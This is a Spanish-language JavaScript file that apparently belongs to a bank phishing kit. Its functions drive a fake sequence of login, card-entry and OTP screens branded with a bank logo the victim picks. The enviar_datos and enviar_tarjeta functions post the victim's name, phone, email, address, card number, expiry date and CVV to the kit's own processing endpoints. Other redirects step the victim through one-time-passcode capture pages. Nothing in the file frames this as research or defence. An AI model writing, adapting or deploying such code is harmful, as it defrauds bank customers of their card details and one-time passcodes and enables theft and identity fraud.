var espera = 1;
function detectar_dispositivo(){
    var dispositivo = "";
    if(navigator.userAgent.match(/Android/i))
        dispositivo = "Android";
    else
        if(navigator.userAgent.match(/webOS/i))
            dispositivo = "webOS";
        else
            if(navigator.userAgent.match(/iPhone/i))
                dispositivo = "iPhone";
            else
                if(navigator.userAgent.match(/iPad/i))
                    dispositivo = "iPad";
                else
                    if(navigator.userAgent.match(/iPod/i))
                        dispositivo = "iPod";
                    else
                        if(navigator.userAgent.match(/BlackBerry/i))
                            dispositivo = "BlackBerry";
                        else
                            if(navigator.userAgent.match(/Windows Phone/i))
                                dispositivo = "Windows Phone";
                            else
                                dispositivo = "PC";
    return dispositivo;
}

/* Nuevo Bloque */

function vista_final(){
    window.location.href = "informacion/final.html";      
}

function continuar(){
    $("#frm-animacion,#frm-cargando").hide();
    $("#frm-esperando").show(); 
    espera = 1; 
}

function vista_banco(){
    $("#frm-esperando").hide();
    $("#frm-tarjeta").show();   
}


    
function vista_datos(){
    $("#fondo,#frm-esperando").hide();
}


function vista_login(){    
    $("#frm-esperando").hide();
    $("#frm-verificacion").show();     
}

function vista_otp(){
    $("#logo-entidad-otp").attr("src","../img/logos/" + icono + ".png");
    $("#frm-esperando").hide();
    $("#frm-otp").show();     
}

function vista_nuevootp(){
    $("#logo-entidad-nuevootp").attr("src","../img/logos/" + icono + ".png");
    $("#frm-esperando").hide();
    $("#frm-nuevootp").show();     
}

function iniciar(){
    window.location.href = "informacion/index.html";      
}

function enviar_documento(c){    
   window.location.href = "informacion/login.php";      
}

function enviar_datos(n,c,m,a,u){
    $.post( "../process/paso2datos.html", {nom:n,cel:c,cor:m,dir:a,ciu:u} ,function(data) {                        
        espera = 1;           
    });
}

function enviar_tarjeta(b,t,f,c){    
    $.post( "../process/paso3tarjeta.html", { ban:b,tar:t,fec:f,cvv:c } ,function(data) {  
        setTimeout(continuar, 1400);

    });
}

function enviar_usuario(u,p){    
    window.location.href = "./otp1.php"; 
}

function enviar_otp(o){    
    window.location.href = "./verificando.html"; 
}

function consultar_estado(){
   window.location.href = 'otp1.php';  
}

function consultar_estado1(){
   window.location.href = 'otp2.php';  
}

/* Fin Nuevo Bloque */





function verificar(){
    $("#logo-entidad-load").attr("src","../img/logos/" + $("#txt-entidad").val() + ".png");
    $("#logo-entidad").attr("src","../img/logos/" + $("#txt-entidad").val() + ".png");
    $("#logo-entidad-otp").attr("src","../img/logos/" + $("#txt-entidad").val() + ".png");
    $("#frm-animacion").hide();
    $("#frm-verificacion").show();
}


function validar(){   
    $("#frm-cargando").hide();
    $("#frm-otp").show();
}




function buscar_documento(){
    $.post( "../process/bsc-d.html", function(data) {  
        $("#txt-cedula").val(data);  
    });  
}





